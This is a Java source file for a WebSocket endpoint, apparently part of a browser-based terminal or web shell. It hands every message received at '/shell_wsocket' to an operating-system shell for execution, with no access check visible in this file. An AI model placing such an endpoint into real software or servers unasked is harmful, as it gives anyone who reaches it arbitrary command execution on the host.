package webshell.shell;

import javax.websocket.OnClose;
import javax.websocket.OnError;
import javax.websocket.OnMessage;
import javax.websocket.OnOpen;
import javax.websocket.Session;
import javax.websocket.server.ServerEndpoint;

import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;


@ServerEndpoint(value="/shell_wsocket", configurator=ShellEndPointConfigurator.class)
public class ShellEndPoint {
    
    private static final Log log = LogFactory.getLog(ShellEndPoint.class);
    IShell os = null;
 
    /**
     * Callback hook for Connection open events. This method will be invoked when a
     * client requests for a WebSocket connection.
     * @param userSession the userSession which is opened.
     */
    @OnOpen
    public void onOpen(Session session) {
        log.debug("SessionId: " + session.getId());
        log.debug("MaxBinaryMessageBufferSize: " + session.getMaxBinaryMessageBufferSize());
        log.debug("MaxTextMessageBufferSize: " + session.getMaxTextMessageBufferSize());
		if( os == null ){
	        os = ShellFactory.createOS(session.getBasicRemote());
	        if (os == null) {
	            log.error("Cannot establish operating system access.");
	        }
        }
    }
     
    /**
     * Callback hook for Connection close events. This method will be invoked when a
     * client closes a WebSocket connection.
     * @param userSession the userSession which is opened.
     */
    @OnClose
    public void onClose(Session session) {
        log.debug("SessionId: " + session.getId());
        if (os != null)
            os.terminate();
    }
     
    /**
     * Callback hook for Message Events. This method will be invoked when a client
     * send a message.
     * @param message The text message
     * @param userSession The session of the client
     */
    @OnMessage
    public void onMessage(String message, Session session) {
        log.debug("SessionId: " + session.getId() + " message: "+ message);

        if (os == null) {
            log.error("Cannot establish operating system access.");
            return;
        }

        if( session.getUserProperties().get("history") != null ){
        	log.debug("history: " + session.getUserProperties().get("history"));
        }
        
        session.getUserProperties().put("history", message);
        String result = "";
        
         try {
        	 os.execute(message);
        } catch (Exception e) {
            log.error("Failed to execute command "
                    + message, e);
        }
    }
    
    @OnError
    public void onError(Throwable t) throws Throwable {
        log.error("", t);
    }

}